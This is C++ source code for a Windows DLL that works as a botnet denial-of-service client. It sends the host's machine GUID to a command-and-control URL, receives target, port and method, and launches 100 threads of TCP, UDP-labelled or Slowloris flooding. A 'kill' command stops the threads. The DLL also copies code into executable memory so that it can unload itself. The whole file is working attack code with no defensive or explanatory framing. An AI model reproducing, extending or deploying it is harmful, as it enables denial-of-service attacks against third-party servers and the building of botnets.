

#include "pch.h"
#include "DarkRequest.h"
#include "Flood.h"
#include <thread>
#include <stdio.h> 
#include <thread>
#include <vector>
#include <sstream>
#include <utility>
#include <WinSock2.h>
#pragma comment(lib,"ws2_32.lib")
#define MAX_PACKET_SIZE 4096

extern "C"
{
	#define RND_CHAR (char)((rand() % 26)+97)
	bool task1_running = false;
	bool stopTask = false;
	std::string globalTaskIDRunning = "0";
	std::string maxtime;
	void split(const std::string& str, const std::string& delimiter, std::vector<std::string>& arr) {
				
		int strleng = str.length();
		int delleng = delimiter.length();
		//if (delleng == 0)
			//return arr;//no change
		int i = 0;
		int k = 0;
		while (i < strleng)
		{
			int j = 0;
			while (i + j < strleng && j < delleng && str[i + j] == delimiter[j])
				j++;
			if (j == delleng)//found delimiter
			{
				arr.push_back(str.substr(k, i - k));
				i += delleng;
				k = i;
			}
			else {
				i++;
			}
		}
		arr.push_back(str.substr(k, i - k));
		//return arr;
	}





	static std::string GetMachineGUID()
	{
		std::string ret;
		char value[64];
		DWORD size = _countof(value);
		DWORD type = REG_SZ;
		HKEY key;
		LONG retKey = ::RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ | KEY_WOW64_64KEY, &key);
		LONG retVal = ::RegQueryValueExA(key, "MachineGuid", nullptr, &type, (LPBYTE)value, &size);
		if (retKey == ERROR_SUCCESS && retVal == ERROR_SUCCESS) {
			ret = value;
		}
		::RegCloseKey(key);
		return ret;
	}


	DWORD WINAPI TCPThread(PVOID p)
	{
		SOCKET s;
		sockaddr_in* sai;
		char packet[2048];
		int n;
		memset(packet, 0, 2048);
		sai = (sockaddr_in*)p;
		while (1)
		{
			s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

			if (s != INVALID_SOCKET)
			{
				connect(s, (sockaddr*)sai, sizeof(sockaddr_in));
				send(s, packet, sizeof(packet) - 1, 0);

				while (1)
				{
					n = send(s, packet, 1, 0);

					if (n == SOCKET_ERROR)
					{
						break;
					}
					Sleep(100);
				}

				closesocket(s);
			}
		}
	}


	DWORD WINAPI UDPThread(PVOID p)
	{
		SOCKET s;
		sockaddr_in* sai;
		char packet[2048];
		int n;
		memset(packet, 0, 2048);
		sai = (sockaddr_in*)p;
		while (1)
		{
			s = socket(AF_INET, SOCK_STREAM, IPPORT_BIFFUDP);

			if (s != INVALID_SOCKET)
			{
				connect(s, (sockaddr*)sai, sizeof(sockaddr_in));
				send(s, packet, sizeof(packet) - 1, 0);

				while (1)
				{
					n = send(s, packet, 1, 0);

					if (n == SOCKET_ERROR)
					{
						break;
					}
					Sleep(100);
				}

				closesocket(s);
			}
		}
	}

	DWORD WINAPI SlowlorisThread(PVOID p)
	{
		SOCKET s;
		sockaddr_in* sai;

		char header[] = "GET /", a = 'A';
		int n;

		sai = (sockaddr_in*)p;
		while (1)
		{
			s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

			if (s != INVALID_SOCKET)
			{
				connect(s, (sockaddr*)sai, sizeof(sockaddr_in));
				send(s, header, sizeof(header) - 1, 0);

				while (1)
				{
					n = send(s, &a, 1, 0);

					if (n == SOCKET_ERROR)
					{
						break;
					}
					Sleep(100);
				}

				closesocket(s);
			}
		}
	}
		
	__declspec(dllexport) void BackConnect(std::string url)
	{
		int n = 20;
		std::thread hThread;
		std::vector<HANDLE> threads(100);



		while (true) {
			//std::cout << "Waiting \n";

			std::string post = "hwid=" + GetMachineGUID() + "&taskrunning=" + std::to_string(task1_running) + "&taskid=" + globalTaskIDRunning;

			//std::cout << url;
			std::string response = postRequest(url, post);




			if (response.find("newddos") != std::string::npos) {
				std::vector<std::string> v;

				split(response, ";", v);

				std::string taskid = v[1];
				std::string method = v[2];
				std::string targetip = v[3];
				std::string port = v[4];
				maxtime = v[5];

				//std::istringstream iss
				globalTaskIDRunning = taskid;

				if (!task1_running) {
					stopTask = false;
					std::cout << "New Task \n";

					ULONG i;
					hostent* host;
					sockaddr_in sai;
					task1_running = true;

					WSADATA wd;
					if (WSAStartup(0x202, &wd))
					{
						printf("\nError: Unable to initialize Winsock\n");

					}


					char* hostHelper;
					char* pathHelper;
					HTTPURL u(targetip);

					hostHelper = (char*)u.domain.c_str();
					pathHelper = (char*)u.path.c_str();
					host = gethostbyname(hostHelper);
					if (!host)
					{
						return;
					}

					sai.sin_family = AF_INET;
					sai.sin_addr.S_un.S_addr = *(PULONG)host->h_addr;
					sai.sin_port = htons(strtoul(port.c_str(), NULL, 0));

					//printf("\nCreating 1000 threads for attack...\n");

					for (i = 0; i < 100; i++)
					{
						if (method == "slow") {
							threads[i] = CreateThread(NULL, 0, SlowlorisThread, &sai, 0, NULL);
						}
						else if (method == "tcp") {
							threads[i] = CreateThread(NULL, 0, TCPThread, &sai, 0, NULL);
						}
						else if (method == "udp") {
							threads[i] = CreateThread(NULL, 0, UDPThread, &sai, 0, NULL);
						}
					}

				}
			}
			else if (response == "kill") {
				globalTaskIDRunning = "0";
				task1_running = false;
				stopTask = true;
				
				for (auto& th : threads) {
					TerminateThread(th, 0);
					CloseHandle(th);
				}
				
				std::cout << "Kill Threads \n";
				break;
				return;
			}


			Sleep(2500);
		}
		return;
	}

}


typedef BOOL(WINAPI* PFreeLibrary)(_In_ HMODULE hModule);
typedef VOID(WINAPI* PExitThread)(_In_ DWORD dwExitCode);
typedef unsigned int (WINAPI* PTHREADPROC)(LPVOID lParam);

typedef struct _DLLUNLOADINFO
{
	PFreeLibrary	m_fpFreeLibrary;
	PExitThread		m_fpExitThread;
	HMODULE		    m_hFreeModule;
}DLLUNLOADINFO, * PDLLUNLOADINFO;

unsigned int WINAPI DllUnloadThreadProc(LPVOID lParam)
{
	PDLLUNLOADINFO pDllUnloadInfo = (PDLLUNLOADINFO)lParam;

	//  
	// FreeLibrary dll  
	//  
	(pDllUnloadInfo->m_fpFreeLibrary)(pDllUnloadInfo->m_hFreeModule);

	//
	// Exit Thread
	// This thread return value is freed memory.
	// So you don't have to return this thread.
	//
	pDllUnloadInfo->m_fpExitThread(0);
	return 0;
}


VOID DllSelfUnloading(_In_ const HMODULE hModule)
{
	PVOID pMemory = NULL;
	ULONG ulFuncSize;
	unsigned int uintThreadId = 0;

	pMemory = VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (pMemory != NULL)
	{
		ulFuncSize = (ULONG_PTR)DllUnloadThreadProc - (ULONG_PTR)DllSelfUnloading;
		if ((ulFuncSize >> 31) & 0x01)
		{
			ulFuncSize = (ULONG_PTR)DllSelfUnloading - (ULONG_PTR)DllUnloadThreadProc;
		}

		memcpy(pMemory, DllUnloadThreadProc, ulFuncSize);

		((PDLLUNLOADINFO)(((ULONG_PTR)pMemory) + 0x500))->m_fpFreeLibrary =
			(PFreeLibrary)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "FreeLibrary");

		((PDLLUNLOADINFO)(((ULONG_PTR)pMemory) + 0x500))->m_fpExitThread =
			(PExitThread)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "ExitThread");

		((PDLLUNLOADINFO)(((ULONG_PTR)pMemory) + 0x500))->m_hFreeModule = hModule;

		_beginthreadex(NULL, 0, (PTHREADPROC)pMemory, (PVOID)(((ULONG_PTR)pMemory) + 0x500), 0, &uintThreadId);
	}
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		// Create your thread here to unload your dlls
		DllSelfUnloading((HMODULE)hModule);
	default:
		break;
	}
	return TRUE;
}